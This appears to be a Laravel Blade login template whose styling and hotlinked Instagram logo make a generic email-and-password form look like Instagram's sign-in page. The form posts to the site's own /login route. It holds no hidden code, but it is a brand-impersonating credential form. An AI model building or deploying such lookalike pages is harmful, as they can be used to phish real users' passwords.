<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 40px;
            text-align: center;
            width: 350px;
            box-sizing: border-box;
        }

        .instagram-logo {
            width: 175px; /* Adjust as needed */
            margin-bottom: 30px;
        }

        h2 {
            display: none; /* Hide the original H2 as we'll use an image for the logo */
        }

        .login-container form {
            display: flex;
            flex-direction: column;
        }

        .login-container input {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 10px 8px;
            margin-bottom: 6px;
            font-size: 14px;
            width: 100%;
            box-sizing: border-box;
        }

        .login-container button {
            background-color: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px; /* Slightly more rounded for buttons */
            padding: 10px 0;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background-color 0.2s ease;
        }

        .login-container button:hover {
            background-color: #007acb;
        }

        .separator {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
        }

        .separator::before,
        .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator:not(:empty)::before {
            margin-right: .25em;
        }

        .separator:not(:empty)::after {
            margin-left: .25em;
        }

        .separator span {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .forgot-password {
            font-size: 12px;
            color: #00376b;
            margin-top: 12px;
            text-decoration: none;
        }

        .signup-link {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 20px;
            text-align: center;
            width: 350px;
            margin-top: 10px;
            font-size: 14px;
            box-sizing: border-box;
        }

        .signup-link a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        .message {
            margin-bottom: 15px;
            font-size: 14px;
            font-weight: 600;
        }

        .message.success {
            color: green;
        }

        .message.error {
            color: red;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="instagram-logo">

        @if (session('success'))
            <p class="message success">{{ session('success') }}</p>
        @endif

        @if ($errors->any())
            <p class="message error">{{ $errors->first() }}</p>
        @endif

        <form method="POST" action="/login">
            @csrf
            <input type="text" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>

            <button type="submit">Log In</button>
        </form>

    </div>

    <div class="signup-link">
        Don't have an account? <a href="/register">Sign up</a>
    </div>
</body>
</html>